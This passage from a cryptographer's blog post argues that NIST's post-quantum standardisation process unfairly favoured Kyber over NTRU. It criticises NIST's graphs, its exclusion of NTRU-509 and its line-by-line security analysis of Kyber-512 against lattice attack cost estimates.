(as measured by Core-SVP)
than Kyber, right?</p>
<p>Of course not.
NIST concealed the fact
that NTRU was offering higher security levels than Kyber:</p>
<ul>
<li>
<p>NIST's big graph
  doesn't show any NTRU options in the top "category".
  (The cover story writes itself:
  The NTRU submission didn't provide optimized software for the new options!
  Reporting reference speeds would have been unfair!
  NIST is just trying to protect readers from being misled!)</p>
</li>
<li>
<p>For readers who go to the effort of looking at the small graph,
  the discretization attack
  makes NTRU's higher security levels
  look just like Kyber's lower security levels.</p>
</li>
</ul>
<p>Readers looking at NIST's graphs are left with the impression
that NTRU is <em>less</em> flexible than Kyber
and, in particular,
has <em>more</em> trouble reaching high security levels.
This is exactly the opposite of the facts.</p>
<p><strong>Tilting the competition, part 4: throwing away the highest-performance option.</strong>
NTRU-1229 and NTRU-HRSS-1373 aren't the only options
that NIST excluded from its big graph.
Let's again look at the low end,
the top-performance end,
where NIST chose to exclude NTRU-509.</p>
<p>Optimized NTRU-509 software was already available.
If NIST had included NTRU-509 in the big graph
then that graph would have shown NTRU-509 as the best performer,
better than Kyber-512.</p>
<p>Accounting for key reuse
would have further favored NTRU-509.
Accounting for Montgomery's trick
would have further favored NTRU-509.
Upgrading from Haswell
would have further favored NTRU-509.
Counting 1000 cycles per byte for Alice <em>and</em> for Bob
would have further favored NTRU-509.</p>
<p>But NIST simply removed NTRU-509 from the big graph,
making NTRU look strictly worse than Kyber in that graph.</p>
<p>NIST went even further in its subsequent report
selecting Kyber for standardization:
<a href="https://web.archive.org/web/20230824124130/https://nvlpubs.nist.gov/nistpubs/ir/2022/NIST.IR.8413-upd1.pdf">the report</a>
didn't show NTRU-509 in any of the figures or tables.
The report's descriptions of Kyber's performance
were visibly more positive
than its descriptions of NTRU's performance,
as illustrated by
NIST's claim that NTRU has "somewhat larger public keys and ciphertexts" than Kyber.</p>
<p>How does NIST stop people from quickly spotting the errors in
this "somewhat larger public keys and ciphertexts" claim?</p>
<p>A discretization attack
easily hides the fact that NTRU has smaller sizes than Kyber at intermediate security levels,
but it doesn't hide NTRU-509 being smaller than Kyber-512.
NIST's narrative also relied on kicking out NTRU-509.</p>
<p>How can NIST justify throwing NIST-509 away?</p>
<p>The only possible answer
is claiming that NTRU-509 doesn't reach the minimum allowed NISTPQC security level,
the security level of AES-128.
But, at the same time, NIST is including Kyber-512,
so NIST is claiming that Kyber-512
<em>does</em> reach the security level of AES-128.</p>
<p>NTRU-509 has Core-SVP 2<sup>106</sup>, just
6 bits below Kyber-512's original Core-SVP (2<sup>112</sup>)
or
12 bits below Kyber-512's revised Core-SVP (2<sup>118</sup>).
Evidently NIST is claiming that AES-128 is inside this narrow margin:
in other words, that
NTRU-509 has <em>slightly</em> lower security than AES-128
while Kyber-512 has <em>slightly</em> higher security than AES-128.</p>
<p><img src="https://blog.cr.yp.to/20231003/shattering.png">
Let's take a moment to admire how spectacularly fragile this is:</p>
<ul>
<li>
<p>If some effect slightly increases lattice security levels
  compared to what NIST is claiming,
  then NTRU-509 is back in the game,
  outperforming all of the Kyber options.</p>
</li>
<li>
<p>If some effect slightly reduces lattice security levels
  compared to what NIST is claiming,
  then Kyber-512 is gone,
  and NTRU-677 outperforms all of the Kyber options.</p>
</li>
<li>
<p><em>If</em> security levels are measured in a way that
<em>just</em> manages to have Kyber-512 retained while NTRU-509 isn't retained,
then NTRU's superior flexibility still provides the highest security level
and wins at various intermediate levels,
but Kyber wins at other intermediate levels
and provides the highest performance level,
so putting enough weight on the highest performance level favors Kyber.</p>
</li>
</ul>
<p>See how important it is
for Kyber-512 to reach the AES-128 security level?
Without that, Kyber is in big trouble:
NTRU provides the highest level of security
<em>and</em> the highest level of performance
<em>and</em> the best flexibility.</p>
<p><strong>The chaos beyond Core-SVP.</strong>
How is Kyber-512 supposed to reach the AES-128 security level
if AES-128 needs more than 2<sup>140</sup> bit operations to break
while the Core-SVP security estimate for Kyber-512 is only 2<sup>118</sup>?</p>
<p>This question was briefly addressed in the
<a href="https://web.archive.org/web/20230323095809/https://pq-crystals.org/kyber/data/kyber-specification.pdf">round-1 Kyber submission</a>
in 2017.
That submission said that the 2017 version of Kyber-512 had Core-SVP 2<sup>112</sup>,
falling short of the target by 30 bits,
but gave a five-line list of reasons that "it seems clear"
that Kyber-512 has at least 30 bits more security than Core-SVP indicates.</p>
<p>The
<a href="https://web.archive.org/web/20230919163511/https://pq-crystals.org/kyber/data/kyber-specification-round2.pdf">round-2 Kyber submission</a>
in 2019
made the same claim regarding the 2019 version of Kyber-512.
In 2020,
I <a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/o2roJXAlsUk/m/EHW9h87kAAAJ">disproved</a>
the stated rationale.
To summarize:</p>
<ul>
<li>
<p>Kyber's argument that it was gaining security from
  "the additional rounding noise (the LWR problem, see [13, 8]), i.e. the
  deterministic, uniformly distributed noise introduced in ciphertexts via [rounding]" was simply wrong.
  Attackers could freely target Kyber's keys, and the keys didn't have any rounding.</p>
</li>
<li>
<p>Kyber's argument that it was gaining security from the
  "additional cost of sieving with asymptotically subexponential complexity"
  was <a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/o2roJXAlsUk/m/5ORleAt4AQAJ">unfounded and probably wrong</a>:
  as far as I could tell (and as far as we know today),
  the actual asymptotics are subexponentially <em>faster</em> than Core-SVP,
  not subexponentially slower.
  It was still plausible that the costs for specific sizes such as Kyber-512
  were higher than Core-SVP,
  but this required an analysis that Kyber hadn't carried out.</p>
</li>
<li>
<p>Kyber's arguments that it was gaining security from
  "the (polynomial) number of calls to the SVP oracle that are
  required to solve the MLWE problem"
  and "the gate count required for one 'operation' "
  were plausible, but didn't seem to be enough to rescue Kyber-512 without further help.</p>
</li>
<li>
<p>Kyber's argument that it was gaining security from
  "the cost of access into exponentially large memory"
  was plausible as a matter of real-world attack costs.
  NTRU Prime had already proposed a particular way to quantify this cost.</p>
<p>However,
the
<a href="https://web.archive.org/web/20220119113311/https://csrc.nist.gov/CSRC/media/Projects/Post-Quantum-Cryptography/documents/call-for-proposals-final-dec-2016.pdf">official call for submissions</a>
had asked for a security level of at least 2<sup>143</sup> "classical gates"
without regard to memory-access costs.
So this argument was useless for rescuing Kyber-512:
it wasn't what the official evaluation criteria were asking for.</p>
</li>
</ul>
<p>To try to rescue Kyber-512,
the
<a href="https://web.archive.org/web/20230310174959/https://pq-crystals.org/kyber/data/kyber-specification-round3-20210804.pdf">round-3 Kyber submission</a></p>
<ul>
<li>
<p>changed Kyber-512 and (as noted above) redefined Core-SVP
  to obtain Core-SVP 2<sup>118</sup> rather than 2<sup>112</sup>;</p>
</li>
<li>
<p>took (without credit) my <a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/o2roJXAlsUk/m/5ORleAt4AQAJ">preliminary analysis</a>
  of the gaps between Core-SVP and reality;</p>
</li>
<li>
<p>added further numerical estimates regarding the gaps
  and the "known unknowns";</p>
</li>
<li>
<p>concluded that this preliminary analysis
  gave a <strong>32-bit range of security estimates</strong>,
  specifically 151 bits plus or minus 16 "in either direction";
  and</p>
</li>
<li>
<p>claimed that dropping to 135 wouldn't be "catastrophic,
  in particular given the massive memory requirements
  that are ignored in the gate-count metric".</p>
</li>
</ul>
<p>The memory argument again wasn't relevant,
given the official evaluation criteria asking for 2<sup>143</sup> "classical gates".
Kyber-512 wasn't claiming to require 2<sup>143</sup> "classical gates" to break;
it was claiming some undetermined number between 2<sup>135</sup> and 2<sup>167</sup>.</p>
<p>Various papers then appeared
claiming to cut further bits out of lattice security in various ways,
such as a <a href="https://eprint.iacr.org/2022/239">2022 paper</a>
reporting an order-of-magnitude speedup
from tweaking the "BKZ" layer inside attacks.
Many of the papers made the analyses of lattice security
even more complicated and even less stable than before.
For example, for one line of "dual attacks":</p>
<ul>
<li>
<p>there's an Asiacrypt paper and a paper from Israel's Matzov organization
  with complicated analyses claiming to reduce Kyber-512's 151 to 137;</p>
</li>
<li>
<p>but then there's a Crypto paper
  <a href="https://eprint.iacr.org/2023/302">"Does the dual-sieve attack on learning with errors even work?"</a>
  giving the impression that, no, this whole line of attacks fails;</p>
</li>
<li>
<p>but then the actual contents of the Crypto paper
  are merely saying that there's a "presumably significant" change in the improvements without <em>quantifying</em> the change;</p>
</li>
<li>
<p>but then there's a new paper
  <a href="https://eprint.iacr.org/2023/1238">"A remark on the independence heuristic in the dual attack"</a>
  that sounds like it's helping quantify the change;</p>
</li>
<li>
<p>but that paper still doesn't get all the way to
  claiming any particular attack cost for Kyber-512;</p>
</li>
<li>
<p>but then there's another new paper
  <a href="https://eprint.iacr.org/2023/1460">"Rigorous foundations for dual attacks in coding theory"</a>
  that, for a dual attack against an analogous low-rate decoding problem,
  says that a "slight modification of this algorithm"
  avoids the issue raised in the Crypto paper;</p>
</li>
<li>
<p>but that paper doesn't analyze what the idea means for lattices;</p>
</li>
<li>
<p>but then there's another new paper
  <a href="https://eprint.iacr.org/2023/1508">"Provable dual attacks on learning with errors"</a>
  that says it proves the correctness of a simplified dual attack for lattices;</p>
</li>
<li>
<p>but that paper also doesn't quantify consequences for Kyber-512.</p>
</li>
</ul>
<p>And this is just one small piece of a giant unholy mess
that some cryptographers say we should trust.</p>
<p>How, back in 2022, did NIST end up concluding that Kyber-512 is as hard to break as AES-128?
Time to look at some quotes.
I'll go through the quotes in two parts:
first, looking at what NIST said its notion of hardness was;
second, going line by line through what NIST said about Kyber-512's security level.</p>
<p><strong>NIST rescuing Kyber-512, part 1: manipulating the qualification criteria.</strong>
In the call for submissions,
it was crystal clear that cryptosystems had to be at least as hard to break as AES-128
in <em>every</em> "potentially relevant" cost metric:</p>
<blockquote>
<p>Each category will be defined by a comparatively easy-to-analyze reference primitive,
whose security will serve as a floor for a wide variety of metrics that NIST deems
potentially relevant to practical security. ...</p>
<p>In order for a
cryptosystem to satisfy one of the above security requirements, any attack must require
computational resources comparable to or greater than the stated threshold, with respect
to <em>all</em> metrics that NIST deems to be potentially relevant to practical security.</p>
</blockquote>
<p>(Emphasis in original.)</p>
<p>The call commented on the "classical gates" to break AES-128 etc.
Obviously "classical gates" were a "potentially relevant" cost metric.</p>
<p>What exactly is this metric?
The literature defines many different gate sets.
NIST dodged years of requests to define exactly which gates
it was including as "classical gates".
NIST's 2022
<a href="https://web.archive.org/web/20230824124130/https://nvlpubs.nist.gov/nistpubs/ir/2022/NIST.IR.8413-upd1.pdf">selection report</a>
finally pinned down one part of this,
allowing "each one-bit memory read or write" as a cost-1 gate.</p>
<p>Here's an illustration of how important definitions of cost metrics are:</p>
<ul>
<li>
<p>Kyber's security analysis relies on
  an <a href="https://eprint.iacr.org/2019/1161">Asiacrypt 2020 paper</a>
  for counting the number of "gates" inside the most important attack step
  inside "primal" attacks.</p>
</li>
<li>
<p>Tung Chou and I have a new paper
  <a href="https://cat.cr.yp.to/papers.html">"CryptAttackTester: formalizing attack analyses"</a>
  including an appendix that, for Kyber-512,
  <strong>cuts almost 10 bits out of the "gate" count</strong>
  for the "primary optimisation target" in the Asiacrypt 2020 paper,
  exploiting the fact that the Asiacrypt 2020 paper counts a memory-access "gate" as cost 1.
  (The Asiacrypt 2020 paper also relies on this; it's not a typo in that paper.)</p>
</li>
<li>
<p>The same appendix also disproves the claim
  that an "optimal" AES-128 key search requires 2<sup>143</sup> "gates",
  but the reduction in AES-128 "gate" counts
  isn't as large as the reduction in Kyber-512 "gate" counts.</p>
</li>
</ul>
<p>Keep this in mind if you hear people claiming that the costs of lattice attacks have been thoroughly analyzed.</p>
<p>Anyway,
being able to access arbitrarily large amounts of memory for cost 1 isn't realistic:
the actual costs of data communication grow with distance.
But NIST said in 2020
that anyone proposing a replacement metric
<a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/o2roJXAlsUk/m/9oeKbY5MAQAJ">"must at minimum convince NIST that the metric meets the following criteria"</a>,
which "seems to us like a fairly tall order":</p>
<ul>
<li>
<p>"The value of the proposed metric can be accurately measured (or at least lower
  bounded) for all known attacks (accurately mere means at least as accurately as for
  gate count.)"</p>
</li>
<li>
<p>"We can be reasonably confident that all known attacks have been
  optimized with respect to the proposed metric. (at least as confident
  as we currently are for gate count.)"</p>
</li>
<li>
<p>"The proposed metric will more accurately reflect the real-world
  feasibility of implementing attacks with future technology than gate
  count -- in particular, in cases where gate count underestimates the
  real-world difficulty of an attack relative to the attacks on AES or
  SHA3 that define the security strength categories."</p>
</li>
<li>
<p>"The proposed metric will not replace these underestimates with overestimates."</p>
</li>
</ul>
<p>There have been no announcements on the NISTPQC mailing list
of anyone claiming to have met these minimum criteria,
never mind the question of whether such a claim could survive public scrutiny.</p>
<p>Recall that
NIST excluded NTRU-509
from the figures and tables in its selection report,
the report announcing the selection of Kyber over NTRU.
If you look for the report's explanation of <em>why</em> NIST excluded NTRU-509,
you'll find the following quote:</p>
<blockquote>
<p>The submission specification uses both local and non-local cost models for determining
the security category of their parameter sets. For a more direct comparison with the other
KEM finalists, the assignment of security categories according to the non-local cost model
is appropriate. This is what NIST used for NTRU in the figures and tables in this report.</p>
</blockquote>
<p>The underlying definition of "local" accounts for long-distance communication costs,
whereas "non-local" allows accessing arbitrarily large amounts of memory for free.</p>
<p>Everything I've been describing from NIST above, and more,
sounds consistent with the official call for submissions asking for
2<sup>143</sup> "classical gates",
<strong>not counting the costs of memory access</strong>:</p>
<ul>
<li>
<p>To try to avoid overestimating security levels,
  NIST was insisting on counting <em>just</em> bit operations for computation,
  ignoring the costs of communication.</p>
</li>
<li>
<p>In response to the round-1 NTRU Prime submission,
  which provided a
  <a href="https://ntruprime.cr.yp.to/nist/ntruprime-20171130.pdf#subsection.6.7">detailed rationale</a>
  for including the costs of memory access,
  NIST complained in its
  <a href="https://web.archive.org/web/20230920201351/https://nvlpubs.nist.gov/nistpubs/ir/2019/NIST.IR.8240.pdf">round-1 report</a>
  that the submission
  "uses a cost model for lattice attacks
  with higher complexity than many of the other lattice-based candidates".
  (NTRU Prime started reporting Core-SVP in round 2.)</p>
</li>
<li>
<p>In its <a href="https://web.archive.org/web/20230903180546/https://nvlpubs.nist.gov/nistpubs/ir/2020/NIST.IR.8309.pdf">round-2 report</a>,
  as noted above,
  NIST complained that
  "the NTRU submission lacks a category 5 parameter set proposal"
  <em>when memory-access costs are ignored</em>.</p>
</li>
<li>
<p>In its
  <a href="https://web.archive.org/web/20230824124130/https://nvlpubs.nist.gov/nistpubs/ir/2022/NIST.IR.8413-upd1.pdf">selection report</a>,
  NIST kicked out NTRU-509
  because NTRU-509's "category 1" claim
  relied on a "local cost model", i.e., accounting for memory-access costs;
  see above for the full quote.</p>
</li>
</ul>
<p>With this in mind,
consider the fact that NIST was including Kyber-512 in its figures and tables in the same report.
This must mean that NIST was claiming
that breaking Kyber-512 takes at least 2<sup>143</sup> bit operations,
<em>without accounting for memory-access costs</em>, right?</p>
<p>Nope. NIST doesn't ask Kyber
to meet the same criteria as other submissions.</p>
<p>In <a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/4MBurXr58Rs/m/-1Ja0ZYyAQAJ">November 2022</a>,
NIST announced a list of parameter sets that it was "planning" to standardize,
including Kyber-512.
NIST's announcement
avoided claiming that Kyber requires as many "classical gates" to break as AES-128.
The announcement
specifically acknowledged the possibility of Kyber being "a few bits" below
(while omitting the possibility of Kyber being many more bits below):</p>
<blockquote>
<p>It is clear that in the gate-count metric it is a very close call and
that in this metric the pre-quantum security of Kyber-512 may be a few
bits below the one of AES-128.</p>
</blockquote>
<p>Instead the announcement relied on accounting for "realistic memory access costs"
to claim that Kyber-512 qualified for "category 1":</p>
<blockquote>
<p>... the best known attacks against Kyber-512 require huge amounts
of memory and the real attack cost will need to take the cost of
(access to) memory into account.  This cost is not easy to calculate,
as it depends on the memory access patterns  of the lattice algorithms
used for cryptanalysis, as well as the physical properties of the
memory hardware.  Nonetheless, barring major improvements in
cryptanalysis, it seems unlikely that the cost of memory access will
ever become small enough to cause Kyber-512 to fall below category 1
security, in realistic models of security that take these costs into
account.  We acknowledge there can be different views on our current
view to include Kyber-512.</p>
<p>As a point of clarification: in this email, we refer to parameter sets
based on the claimed security strength category where those parameter
sets are most recently specified, irrespective of whether those
parameter sets actually meet their claimed security level. That said,
our current assessment is that, <strong>when realistic memory access costs of
known attacks are taken into account, all the parameter sets we plan
to standardize do, in fact, meet their claimed security strength
categories</strong>.</p>
</blockquote>
<p>(Emphasis added.)</p>
<p><img src="https://blog.cr.yp.to/20231003/inconsistency.png">
So NIST used a "non-local" free-memory metric to kick out NTRU-509,
but used a memory-access-is-expensive metric
to claim that Kyber-512 qualifies for "category 1".
Can anyone tell me how these two things make sense together?</p>
<p>(As a side note,
NIST subsequently
<a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/4MBurXr58Rs/m/VcKp223-DQAJ">stated</a>
that its 2022 selection report was merely reflecting
"the submitters' <u>claimed</u> security categories"
and that the report was making no
"assertions about whether or not the parameter sets
actually provided the claimed level of security".
How does NIST reconcile this with the report kicking out NTRU-509 while keeping Kyber-512?
Both of those submissions
were claiming to achieve "category 1" given memory-access costs.)</p>
<p>For anyone who cares about reviewability of security analyses,
NIST's sudden switch to accounting for Kyber's memory-access costs
should be setting off alarm bells.</p>
<p>None of the official Kyber security analyses
had tried to quantify the effects of memory on security levels.
The Kyber documentation had merely pointed at memory as supposedly saving the day
in case there weren't enough "gates".</p>
<p>In the absence of an analysis,
how exactly was NIST concluding that memory-access costs
were enough to close the gap?</p>
<p><strong>NIST rescuing Kyber-512, part 2: NIST's botched security analysis.</strong>
In early December 2022,
I asked how NIST was arriving at its conclusion that Kyber-512
was as hard to break as AES-128.</p>
<p>NIST followed up with an
<a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/4MBurXr58Rs/m/xHojUDCaBAAJ">explanation</a>
on 7 December 2022.
I'll refer to this explanation as
"NIST's botched security analysis of Kyber-512";
for brevity, "<strong>NISTBS</strong>".</p>
<p>One of the complications in NISTBS is
that it considers a large space of scenarios, with analysis steps mixed
into comments on the likelihood of each scenario.
Even worse,
NISTBS doesn't give any confirming end-to-end examples
of the tallies obtained in each particular scenario.
So a security reviewer has to trace carefully
through each step of NISTBS.</p>
<p>Here's one example of a scenario
from within the space that NISTBS specifies.
I'll call this "scenario X" for future reference.
Scenario X makes the following three assumptions:</p>
<ul>
<li>
<p>Assume accuracy of 2<sup>137</sup> from the most recent attack paper taken
  into account (Matzov) regarding the number of "gates". (This is a
  number specifically mentioned in NISTBS as a starting point; see below.
  NISTBS also considers the more complicated possibility of this estimate
  being invalid.)</p>
</li>
<li>
<p>Assume this isn't affected by the "known unknowns". (This is a
  possibility specifically mentioned in NISTBS; see below. NISTBS
  also considers the more complicated possibility of the security level
  being affected by the "known unknowns".)</p>
</li>
<li>
<p>Assume accuracy of the RAM-cost model in the NTRU Prime
  documentation. (This is one of two sources that NISTBS
  repeatedly points to and calculates numbers on the basis of. NISTBS also
  considers other possibilities for the RAM cost.)</p>
</li>
</ul>
<p>Obviously the quantitative conclusions of NISTBS vary depending on the exact
assumptions. Considering scenario X is simpler than considering
the full space of scenarios. I'll use scenario X as an example below.</p>
<p>Without further ado, here's every line of NISTBS,
NIST's botched security analysis of Kyber-512.</p>
<blockquote>
<p><span color="#663319">
We can elaborate a little bit further on our reasoning leading to our
current assessment that Kyber512 likely meets NIST category I (similar
considerations apply to the other parameter sets we plan to
standardize for lattice-based schemes.)
</span></p>
</blockquote>
<p>This is a preliminary statement regarding the importance of the
calculations at hand. See below for the calculations.</p>
<blockquote>
<p><span color="#663319">
That said, beyond this message, we don’t think further elaboration of
our current position will be helpful. While we did consult among
ourselves and with the Kyber team,
</span></p>
</blockquote>
<p>I filed a formal complaint in December 2022 regarding NIST's lack of
transparency for its investigation of Kyber-512's security level. As
noted above, I filed a new FOIA request in January 2023.</p>
<blockquote>
<p><span color="#663319">
it’s basically just our considered
opinion based on the same publicly available information everyone else
has access to.
</span></p>
</blockquote>
<p>This is not true. NISTBS starts from, e.g., the Matzov paper's
2<sup>137</sup> estimate for "gates", but then goes beyond this in quantifying the
impact of memory costs, something the Matzov paper definitely did not
do. What we'll see later is how NISTBS botches its own calculations
<em>starting from</em> the Matzov number.</p>
<blockquote>
<p><span color="#663319">
The point of this thread is to seek a broader range of
perspectives on whether our current plan to standardize Kyber512 is a
good one, and a long back and forth between us and a single researcher
does not serve that purpose.
</span></p>
</blockquote>
<p>Public review of NIST's security evaluations requires transparency and
clarity regarding those evaluations. It is not appropriate for NIST to
be asking for a range of perspectives while concealing information. An
open and transparent process would involve less "back and forth" than
the process that NIST chose.</p>
<blockquote>
<p><span color="#663319">
Here's how we see the situation:
In April this year, “Report on the Security of LWE” was published by
MATZOV (<a href="https://zenodo.org/record/6412487#.Y4-V53bMKUk">https://zenodo.org/record/6412487#.Y4-V53bMKUk</a>), describing an
attack, assessed in the RAM model to bring some parameter sets,
including Kyber512, slightly below their claimed security strength
categories.
</span></p>
</blockquote>
<p>This is the most recent attack paper mentioned in NISTBS. That's
why my definition of scenario X says "the most recent attack paper
taken into account (Matzov)".</p>
<p>It's surprising that NISTBS doesn't mention any of the newer
attack papers. NIST had hypothesized that there are no "major improvements in
cryptanalysis" (see full quote above), but this doesn't justify ignoring
the improvements that have already been published!</p>
<p>Anyway, given that NISTBS is calculating security levels starting from
the Matzov paper, let's look carefully at those calculations.</p>
<p>"Assessed in the RAM model" appears to be referring to the Matzov
paper counting the number of "gates". As a side note, "the" RAM model is
ambiguous; the literature defines many different RAM models, and many
different sets of "gates", as noted above.</p>
<blockquote>
<p><span color="#663319">
In particular, the report estimates the cost of attacking Kyber512
using a classical lattice attack to be 2<sup>137</sup> bit operations, which is
less than the approximately 2<sup>143</sup> bit operations required to
classically attack AES-128.
</span></p>
</blockquote>
<p>NISTBS takes this 137 as the foundation of various calculations below.</p>
<p>This doesn't mean NISTBS is saying Kyber-512 is broken in 2<sup>137</sup> "gates".
NISTBS is saying that Matzov estimated 137, and then NISTBS is calculating
various consequences of the 137. If the 137 is inaccurate then the
details of the NISTBS calculations (see below) go up or down accordingly.</p>
<p>For purposes of putting together the sources available, the simplest
case to consider is that 2<sup>137</sup> accurately counts the number of "gates".
Scenario X explicitly assumes this.</p>
<blockquote>
<p><span color="#663319">
However, like previous lattice attacks, the MATZOV attack is based on
sieving techniques, which require a large amount of (apparently
unstructured) access to a very large memory.
</span></p>
</blockquote>
<p>In announcing its plans to standardize Kyber-512, NIST had said that
"the best known attacks against Kyber-512 require huge amounts of
memory"; here NISTBS is reiterating this.</p>
<blockquote>
<p><span color="#663319">
The RAM model ignores the cost of this memory access,
</span></p>
</blockquote>
<p>Indeed, the "gate" counts in question ignore the cost of memory access.</p>
<blockquote>
<p><span color="#663319">
and while the science of comparing the cost of memory access to other
costs involved in a large cryptanalytic attack is not as mature as we
would like, it seems overwhelmingly likely that, in any realistic
accounting of memory access costs, these will significantly exceed the
costs that are assessed by the RAM model for lattice sieving. 
</span></p>
</blockquote>
<p>Here are three obvious examples of quantitative questions raised by this
part of NISTBS. Quantification is essential for cryptographic security
review.</p>
<p>First, what exactly does "significantly" mean in this context?</p>
<p>Second, how does NISTBS reach its "overwhelmingly likely ... significantly
exceed" conclusion?</p>
<p>Third, how does NISTBS get from "significantly exceed" to its conclusion
that having Kyber-512 fall short of AES-128 is "unlikely"? (Assuming no
"major improvements in cryptanalysis".)</p>
<p>NISTBS does eventually get to some quantified calculations; see below.</p>
<blockquote>
<p><span color="#663319">
The largest practical implementation of sieving techniques we know of,
described in detail in “Advanced Lattice Sieving on GPUs, with Tensor
Cores” by Ducas, Stevens, and van Woerden
(https://eprint.iacr.org/2021/141), was forced by memory access
limitations, to adopt settings for bucket size, that would be
suboptimal according to the RAM model.
</span></p>
</blockquote>
<p>Something else unclear from this part of NISTBS is whether "bucket size
... suboptimal" is supposed to imply NIST's "significantly" claim
regarding "costs", and, from there, NIST's claim that it's "unlikely"
for Kyber-512 to be easier to break than AES-128.</p>
<blockquote>
<p><span color="#663319">
It should be noted that, increasing the scale of the instances being
attacked to near cryptographic scale would probably require extensive
hardware optimization, e.g. by using special purpose ASICs, and these
techniques, being generally acknowledged to be less effective against
memory-intensive tasks, would likely make memory access even more of a
bottleneck.
</span></p>
</blockquote>
<p>Qualitatively, this is a reasonable summary of what the literature on
point is saying. However, at this point the reader still doesn't know
how NISTBS gets from this to the claim that Kyber-512 is "unlikely" to
be below the AES-128 security level.</p>
<blockquote>
<p><span color="#663319">
Additionally,
</span></p>
</blockquote>
<p>This is where NISTBS transitions into quantification.</p>
<blockquote>
<p><span color="#663319">
While the Kyber, Dilithium, and Falcon teams did not give a
quantitative assessment of the practical cost of memory access during
sieving against cryptographic parameters, assessments by the NTRU and
NTRUprime teams gave estimates that would suggest the cost of sieving
against category 1 parameters, in models that account for the cost of
memory access, is something like 20 to 40 bits of security more than
would be suggested by the RAM model.
</span></p>
</blockquote>
<p>Finally some numbers to work with! See below for how NISTBS uses these
numbers.</p>
<p>As a side note, NIST seems to have very low confidence in the numbers
it's citing, saying not just "estimates" but also "suggest" and
"something like". But the question I want to focus on here is <em>not</em> how
confident NIST is in the sources that it cites. The question is simply
what security level NISTBS is calculating for Kyber-512 <em>starting from</em>
the sources it cites.</p>
<p>Scenario X explicitly assumes accuracy of one of the two sources that
NISTBS cites, specifically NTRU Prime. In context, this choice of source
is favorable to Kyber:
NISTBS points to NTRU Prime as giving Kyber a
40-bit bonus, and points to NTRU as giving Kyber only a 20-bit bonus.</p>
<blockquote>
<p><span color="#663319">
(For NTRU’s estimates see section 6.3 of the round 3 specification
document available at <a href="https://ntru.org/index.shtml">https://ntru.org/index.shtml</a> . For NTRUprime’s
estimates see section 6.11 of
<a href="https://ntruprime.cr.yp.to/nist/ntruprime-20201007.pdf">https://ntruprime.cr.yp.to/nist/ntruprime-20201007.pdf</a> .
</span></p>
</blockquote>
<p>Scenario X specifically assumes "accuracy of the RAM-cost model in
the NTRU Prime documentation", one of the two sources that NISTBS relies
upon for its quantification. See below for the numbers that NISTBS
obtains from this source.</p>
<blockquote>
<p><span color="#663319">
The Kyber spec (available at
<a href="https://pq-crystals.org/kyber/data/kyber-specification-round3-20210804.pdf">https://pq-crystals.org/kyber/data/kyber-specification-round3-20210804.pdf</a>)
discusses, but does not quantify, memory access costs in section 5.3 (Q6))
</span></p>
</blockquote>
<p>Indeed, what's cited here doesn't quantify this. So let's keep going
with the numbers that NISTBS obtains from other sources.</p>
<blockquote>
<p><span color="#663319">
Taking Matzov's estimates of the attack cost to be accurate,
</span></p>
</blockquote>
<p>This is exactly what scenario X is assuming. Of course, NISTBS also
considers other possibilities, but, as an illustrative example, let's
follow through what NISTBS obtains from this assumption.</p>
<blockquote>
<p><span color="#663319">
only 6 bits of security from memory access costs are required for
Kyber512 to meet category 1,
</span></p>
</blockquote>
<p>Indeed, 137 is "only" 6 bits short of the 143 goal. NIST wants to find 6
bits of security that it can credit to Kyber-512, plus so much security
margin that it can claim not to be worried about the "known unknowns"
etc. The point of NISTBS is to argue that the costs of memory do the job.</p>
<blockquote>
<p><span color="#663319">
so in this case Kyber512 would meet category 1 even if the NTRU and
NTRUprime submission significantly overestimate the cost of memory
access in lattice sieving algorithms.
</span></p>
</blockquote>
<p>Here NIST is finding more than its desired 6 bits of security, by
giving Kyber the aforementioned "20 to 40 bits" coming from "assessments
by the NTRU and NTRUprime teams" of the extra costs coming from memory
access.</p>
<p>For example, if NTRU says 20 and if this is accurate, then NISTBS is
calculating a security level of 137+20 = 157, safely above 143. (Again,
this is explicitly assuming accuracy of the 137 in the first place.)</p>
<p>As another example, if NTRU Prime says 40 and if this is accurate, then
NISTBS is calculating a security level of 137+40 = 177, even farther
above 143. (Once again assuming accuracy of the 137.)</p>
<p>See how simple this calculation is? NISTBS points to its sources as
saying that there are actually "20 to 40 bits of security more than
would be suggested by the RAM model" (in NIST's words). So NISTBS adds
20 or 40 to Matzov's 137, giving 157 or 177.</p>
<p>NIST says that even if those sources have "significantly" overestimated
the memory-access cost then Kyber-512 is still okay. To figure out what
NIST means by "significant" here, simply work backwards from NIST's
desired conclusion: if "20 bits" is overestimated by as many as 14 bits,
then that still leaves 20−14 bits, covering the desired 6 bits. Anyway,
Scenario X simply assumes accuracy of the NTRU Prime RAM-cost model.</p>
<blockquote>
<p><span color="#663319">
Further, since about 5 of the 14 claimed bits of security by Matzov
involved speedups to local computations in AllPairSearch (as described
by section 6 of the MATZOV paper), it is likely that Kyber512 would
not be brought below category 1  by the MATZOV attack, as long as
state of the art lattice cryptanalyses prior to the MATZOV paper were
bottlenecked by memory at all.
</span></p>
</blockquote>
<p>It's of course correct that if there's a bottleneck then speeding up
computations outside the bottleneck has little impact. See below for how
NIST seems to be using this to claim <em>even more</em> security.</p>
<blockquote>
<p><span color="#663319">
However, we acknowledge there is some additional uncertainty in the
exact complexity of the MATZOV attack (and all other sieving-based
lattice attacks) due to the known-unknowns Dan alludes to (described
with quantitative estimates in section 5.3 of the Kyber spec.)
</span></p>
</blockquote>
<p>Three reasons that it might be possible to beat Matzov's 2<sup>137</sup> "gates"
are (1) inaccuracies in Matzov's analysis (of course, these could also
point the other way), (2) missing optimizations covered by the "known
unknowns", and (3) missing optimizations beyond the "known unknowns".</p>
<p>Here NIST is pointing to #2. As a side note, it's disturbing to not see
NIST accounting for #1 and #3. NIST explicitly assumed that there are no
"major" improvements in cryptanalysis; but some of its scenarios have
Kyber with very few bits of security margin, and closing those wouldn't
require "major" improvements.</p>
<p>Scenario X skips this complication: it explicitly assumes that the 137
is accurate, and that there are no improvements from the "known
unknowns".</p>
<blockquote>
<p><span color="#663319">
Nonetheless, even taking the most paranoid values for these
known-unknowns (16 bits of security loss),
</span></p>
</blockquote>
<p>This is what the Kyber documentation says is the worst case, yes.</p>
